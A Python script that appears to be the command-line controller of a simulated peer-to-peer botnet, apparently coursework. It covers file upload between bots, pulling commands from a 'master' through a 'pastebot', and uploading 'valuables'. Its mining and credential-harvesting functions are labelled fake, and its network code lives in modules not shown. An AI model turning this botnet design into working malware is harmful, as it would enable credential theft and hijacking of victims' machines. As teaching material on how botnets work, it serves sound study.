
import socket
import time
import threading

from lib.evil import bitcoin_mine, harvest_user_pass
from lib.p2p import find_bot, bot_server
from lib.files import (
    download_from_pastebot,
    filestore,
    p2p_upload_file,
    save_valuable,
    upload_valuables_to_pastebot,
    valuables,
    set_keys_from_secret
)


def p2p_upload(fn):
    """
    Connect to another bot and send a file to them.
    """
    if fn not in filestore:
        print("That file doesn't exist in the botnet's filestore")
        return
    sconn = find_bot()
    if sconn:
        set_keys_from_secret(sconn.shared_secret)
        sconn.send(b"FILE")
        p2p_upload_file(sconn, fn)


def p2p_echo():
    """
    Test secure echo functionality between bots.
    """
    from lib.files import set_keys_from_secret
    try:
        sconn = find_bot()
        if sconn:
            set_keys_from_secret(sconn.shared_secret) 
            sconn.send(b"ECHO")

            while True:
                msg = input("Echo> ")
                byte_msg = msg.encode("ascii")
                sconn.send(byte_msg)

                echo = sconn.recv()
                assert echo == byte_msg

                if msg.lower() in ("x", "exit", "quit"):
                    sconn.close()
                    break
    except socket.error:
        print("Connection closed unexpectedly")


if __name__ == "__main__":
    # Start secure socket server in separate daemon thread
    thr = threading.Thread(target=bot_server)
    thr.daemon = True
    thr.start()

    time.sleep(0.3)  # Let server start before CLI

    while True:
        raw_cmd = input("Enter command: ")
        cmd = raw_cmd.strip().split()

        if not cmd:
            print("You need to enter a command...")
            continue

        # Peer-to-peer botnet commands
        if cmd[0].lower() == "p2p":
            if len(cmd) > 1:
                if cmd[1].lower() == "echo":
                    p2p_echo()
                elif cmd[1].lower() == "upload":
                    if len(cmd) == 3:
                        p2p_upload(cmd[2])
                    else:
                        print("Format: p2p upload <filename>")
                else:
                    print("Unknown p2p subcommand")
            else:
                print("The p2p command requires either 'echo' or 'upload'")
        
        # Pastebot download (e.g. commands from master)
        elif cmd[0].lower() == "download":
            if len(cmd) == 2:
                download_from_pastebot(cmd[1])
            else:
                print("The download command requires a filename")

        # Upload valuables to master
        elif cmd[0].lower() == "upload":
            if len(cmd) == 2:
                upload_valuables_to_pastebot(cmd[1])
            else:
                print("The upload command requires a filename")

        # Fake Bitcoin mining
        elif cmd[0].lower() == "mine":
            print("Mining for Bitcoins...")
            btc = bitcoin_mine()
            save_valuable("Bitcoin: %s" % btc)
            print("Mined and found Bitcoin address:", btc)

        # Fake credential harvesting
        elif cmd[0].lower() == "harvest":
            userpass = harvest_user_pass()
            save_valuable("Username/Password: %s %s" % userpass)
            print("Found user pass:", userpass)

        # List local files and secrets
        elif cmd[0].lower() == "list":
            print("Files stored by this bot:", ", ".join(filestore.keys()))
            print("Valuables stored by this bot:", valuables)

        # Quit the bot
        elif cmd[0].lower() in ("exit", "quit"):
            break

        else:
            print("Command not recognised")
